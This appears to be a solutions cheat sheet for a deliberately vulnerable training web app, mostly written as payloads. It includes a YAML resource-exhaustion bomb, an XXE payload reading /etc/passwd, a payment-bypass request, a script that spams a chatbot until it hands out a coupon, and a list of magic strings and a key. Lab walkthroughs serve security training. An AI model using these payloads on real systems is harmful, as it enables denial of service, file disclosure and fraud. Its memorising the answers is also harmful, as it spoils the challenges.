# Missing Mechanics & Payloads

## 1. Memory Bomb (YAML Bomb) - 5 Stars
**Challenge:** `yamlBombChallenge`
**Trigger:** POST `/file-upload`
**Payload:** `yamlBomb.yml`
```yaml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
**Action:** Upload this file. The server attempts to deserialize it, triggering a resource exhaustion/crash protected by a timeout.
**Curl:**
`curl -i -F 'file=@yamlBomb.yml;filename=yamlBomb.yml' http://localhost:3000/file-upload`

## 2. Cross-Site Imaging (SVG Injection) - 5 Stars
**Challenge:** `svgInjectionChallenge`
**Mechanism:** The challenge listens for a specific Socket.IO event.
**Payload:**
```javascript
const io = require('socket.io-client');
const socket = io('http://localhost:3000', { transports: ['websocket', 'polling'] });

socket.on('connect', () => {
    // The payload must leverage the redirect mechanism to a valid image
    socket.emit('verifySvgInjectionChallenge', '../../../assets/redirect?to=https://placekitten.com/200/300');
});
```

## 3. XXE Data Access - 3 Stars
**Challenge:** `xxeFileDisclosureChallenge`
**Payload:**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ 
  <!ELEMENT foo ANY > 
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]
>
<foo>&xxe;</foo>
```
**Action:** Upload as `file-upload` or via XML endpoints (like B2B if active, though this payload is standard).


## 4. Deluxe Fraud - 3 Stars
**Challenge:** `freeDeluxeChallenge`
**Mechanism:** The payment verification logic checks if payment mode is NOT 'wallet' or 'card', but doesn't validate if it's a valid mode, defaulting to success if those checks pass.
**Payload:**
```javascript
fetch('/rest/deluxe-membership', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json', 
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({ paymentMode: 'free' }) // Anything other than wallet/card
}).then(r => r.json()).then(console.log);
```
**Note:** Requires authentication.

## 5. Bully Chatbot - 1 Star
**Challenge:** `bullyChatbotChallenge`
**Mechanism:** Repeatedly asking the chatbot for a coupon eventually triggers a pity code.
**Trigger Phrases:** "can I have a coupon code", "give me a discount code".
**Script:**
```javascript
const token = localStorage.getItem('token');
const askForCoupon = () => {
    fetch('/rest/chatbot/respond', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
        body: JSON.stringify({ action: 'query', query: 'give me a discount code' })
    }).then(r => r.json()).then(d => {
        console.log(d.body);
        if (!d.body.includes('10%')) setTimeout(askForCoupon, 500);
    });
};
askForCoupon();
```

## 6. Security Advisory (CSAF) - 3 Stars
**Challenge:** `csafChallenge`
**Mechanism:** The server checks if a specific hash (found in `/.well-known/csaf/...`) is present in a Feedback submission or Complaint.
**Hash:** `7e7ce7c65db3bf0625fcea4573d25cff41f2f7e3474f2c74334b14fc65bb4fd26af802ad17a3a03bf0eee6827a00fb8f7905f338c31b5e6ea9cb31620242e843`
**Payload:**
```javascript
fetch('/api/Feedbacks', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({
    comment: "Fixed in 7e7ce7c65db3bf0625fcea4573d25cff41f2f7e3474f2c74334b14fc65bb4fd26af802ad17a3a03bf0eee6827a00fb8f7905f338c31b5e6ea9cb31620242e843",
    rating: 5,
    captchaId: 1, // Requires valid captcha ID/answer in real scenario, or bypass
    captcha: "bypassed" 
  })
}).then(r => r.json()).then(console.log);
```

## 7. Feedback Magic Strings (Various Stars)
**Mechanism:** Post these strings in a Feedback comment (`/api/Feedbacks`) or Complaint (`/api/Complaints`) to solve specific challenges.

| Challenge | Magic String |
|-----------|--------------|
| **Known Vulnerable Component** | `sanitize-html` AND `1.4.2` |
| **Weird Crypto** | `z85` OR `base85` OR `hashids` OR `md5` OR `base64` |
| **Typosquatting (NPM)** | `epilogue-js` |
| **Typosquatting (Angular)** | `ngy-cookie` |
| **Hidden Image** | `pickle rick` |
| **Supply Chain Attack** | `eslint-scope/issues/39` |
| **Leaked API Key** | `6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie` |
